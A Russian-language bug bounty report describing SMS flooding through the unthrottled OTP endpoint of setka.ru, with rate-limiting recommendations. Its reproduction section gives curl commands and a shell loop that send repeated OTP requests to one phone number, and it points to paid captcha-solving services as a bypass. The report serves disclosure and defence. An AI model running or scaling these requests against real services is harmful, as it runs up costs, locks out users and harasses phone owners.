# Report 03: SMS-флуд через OTP — прямой финансовый ущерб

---
**Поля формы:**

- **Название:** SMS-флуд через OTP без rate limiting — прямой финансовый ущерб и DoS аутентификации
- **Уровень опасности:** Средний
- **CWE:** CWE-799 (Improper Control of Interaction Frequency)
- **CVE:** (не указывать)
- **Скоуп:** setka.ru

---

## Где обнаружено

`POST https://setka.ru/login/otp`

## Описание уязвимости

Endpoint `POST /login/otp` на setka.ru позволяет отправлять OTP-коды на **произвольный номер телефона** без ограничения количества запросов. Единственная защита — простая image captcha ($2/1000 решений через антикапчу).

Уязвимость **напрямую влияет на бизнес-процессы**:
1. Каждая SMS = **прямой финансовый расход** (~2-5 руб./SMS). 10,000 SMS = 30,000 руб.
2. Перегрузка SMS-шлюза блокирует **логин всех пользователей** платформы
3. SMS-флуд от имени HH/Setka — **репутационный ущерб** и жалобы в ФАС

## Шаги воспроизведения

### 1. Первый запрос OTP

```bash
curl -X POST \
  -b "X_Bug_Bounty=security_standoff" \
  -H "Content-Type: application/json" \
  -d '{"phone":"+79991234567","captcha_token":"solved_captcha"}' \
  "https://setka.ru/login/otp"
```
→ `200 OK`

### 2. Повторные запросы (5+)

```bash
for i in $(seq 1 5); do
  curl -X POST \
    -b "X_Bug_Bounty=security_standoff" \
    -H "Content-Type: application/json" \
    -d '{"phone":"+79991234567","captcha_token":"solved_captcha_'$i'"}' \
    "https://setka.ru/login/otp"
done
```
→ `200 OK × 5` — все успешны, ни один не заблокирован.

### 3. Captcha bypass

Image captcha решается через 2captcha/anti-captcha за $2/1000. Полная автоматизация SMS-флуда реальна.

## Влияние на безопасность

1. **Финансовый ущерб:** 10,000 SMS × 3 руб. = 30,000 руб. прямых затрат.
2. **DoS аутентификации:** Перегрузка SMS-шлюза блокирует логин легитимных пользователей.
3. **Harassment:** SMS-флуд на произвольный номер от имени бренда HH.
4. **Репутационный ущерб:** Жалобы получателей спам-SMS.

**Рекомендации:** Rate limit 3-5 OTP/час на номер, exponential backoff, reCAPTCHA v3, IP rate limit, phone cooldown 60 сек.

## Дополнительные ссылки

- CWE-799: https://cwe.mitre.org/data/definitions/799.html
- CWE-770: https://cwe.mitre.org/data/definitions/770.html
